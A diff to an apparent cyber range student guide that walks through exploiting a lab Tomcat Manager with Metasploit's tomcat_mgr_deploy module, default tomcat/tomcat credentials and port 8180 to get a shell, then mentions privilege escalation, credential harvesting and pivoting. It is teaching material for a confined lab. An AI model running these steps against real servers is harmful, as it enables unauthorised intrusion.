@@ -142,49 +142,58 @@ msfconsole -q   # -q = quiet, skips the banner
 ```
 
 #### Step 2 — configure and run the exploit (inside msfconsole)
+
+> **Required — do not skip `set PATH`:** Debian's Tomcat serves Manager at `/manager/text`. If you omit `set PATH /manager/text`, the exploit hits the wrong URL and **fails** (you will not get a shell). Confirm that line appears in your Metasploit history before Manual Check.
+
+Type these one at a time (or Copy each line without the `msf6 >` prompt):
+
 ```bash
-msf6 > search tomcat_mgr_deploy
-msf6 > use exploit/multi/http/tomcat_mgr_deploy
-msf6 > set RHOSTS $TARGET_META
-msf6 > set RPORT 8180
-msf6 > set HttpUsername tomcat
-msf6 > set HttpPassword tomcat
-msf6 > set PATH /manager/text
-msf6 > run
+search tomcat_mgr_deploy
+use exploit/multi/http/tomcat_mgr_deploy
+set RHOSTS $TARGET_META
+set RPORT 8180
+set HttpUsername tomcat
+set HttpPassword tomcat
+set PATH /manager/text
+run
 ```
 
 Command | What it does  
 --- | ---  
 `search …` | find the exploit module by name  
 `use …` | select that module to work with  
-`set RHOSTS` | **R** emote **host** — the target's IP (Meta)  
+`set RHOSTS` | **R** emote **host** — the target's IP (Meta); `$TARGET_META` expands in Kali  
 `set RPORT 8180` | **R** emote **port** — where Tomcat listens  
-`set HttpUsername / HttpPassword` | the Manager login — here the defaults `tomcat`/`tomcat`  
-`set PATH /manager/text` | the Manager API path on this Debian Tomcat (see warning below)  
+`set HttpUsername / HttpPassword` | the Manager login — defaults `tomcat` / `tomcat`  
+`set PATH /manager/text` | **required** Manager API path on this Debian Tomcat  
 `run` | fire the exploit  
-  
-Critical — don't skip `set PATH` Debian's Tomcat serves the Manager at `/manager/text`. Without `set PATH /manager/text` the exploit looks in the wrong place and **fails**. 
 
 #### Step 3 — confirm you're in (inside the new session)
 ```bash
-> id
-> whoami
+id
+whoami
 ```
 
-`id` and `whoami` confirm _who you are_ on the target. Success looks like `uid=…(tomcat)` — you're running as the Tomcat service account.
+`id` and `whoami` confirm _who you are_ on the target. Success looks like:
+
+```text
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+```
+
+You are running as the Tomcat service account (the numeric uid may differ; the name in parentheses must be `tomcat`).
 
 #### Step 4 — exit the session (required for scoring)
 ```bash
-> exit
+exit
 ```
 
-Why exit matters here Manual Check reads your **Metasploit history**. That history isn't fully written until the session/console activity is flushed — so this milestone can stay FAIL until you actually run `exit`. If it still fails after a working shell, run one more msf command or close `msfconsole` cleanly, then re-check. 
+> **Why exit matters:** Manual Check reads your **Metasploit history**. That history is not fully written until the session/console activity is flushed — so this milestone can stay FAIL until you actually run `exit`. If it still fails after a working shell, run one more msf command or close `msfconsole` cleanly, then re-check.
 
-**Done when:** your shell context is `tomcat` (e.g. `uid=…(tomcat)`), and you've run `exit`.
+**Done when:** your shell showed a `tomcat` context (e.g. `uid=1001(tomcat) …`), your history includes `set PATH /manager/text`, and you have run `exit`.
 
 **Then:** **Manual Check** on _Tomcat Manager Exploitation_.
 
-What you can do with this You have a shell as the `tomcat` service account. From this foothold you'd enumerate the host, hunt for a **privilege-escalation** path to root, harvest credentials and config files, and pivot to other machines on the pod. This shell is the launch point for the rest of an engagement. 
+> **What you can do with this:** You have a shell as the `tomcat` service account. From this foothold you'd enumerate the host, hunt for a **privilege-escalation** path to root, harvest credentials and config files, and pivot to other machines on the pod. This shell is the launch point for the rest of an engagement. 
 
 ---
 ## 3. Recon playground (explore — not scored)
@@ -209,6 +218,6 @@ Symptom | Fix
 --- | ---  
 Manual Check FAIL after nmap | Press **Enter** , wait ~1s, check again. Make sure you're in the Kali tab.  
 No route / host down | Confirm the pod is **ACTIVE** ; use the exact IPs from your lab header.  
-Tomcat exploit fails | Check `PATH /manager/text`, `RPORT 8180`, and creds `tomcat`/`tomcat`.  
+Tomcat exploit fails / no shell | Re-check history for **`set PATH /manager/text`** (most common miss), plus `RPORT 8180` and creds `tomcat`/`tomcat`.  
 Wrong tab | Tasks 1–4 all run from **Kali** , never the Meta tab.  
 MMDC Cyber Range · Scenario 1 student guide · for use only inside your assigned lab pod.
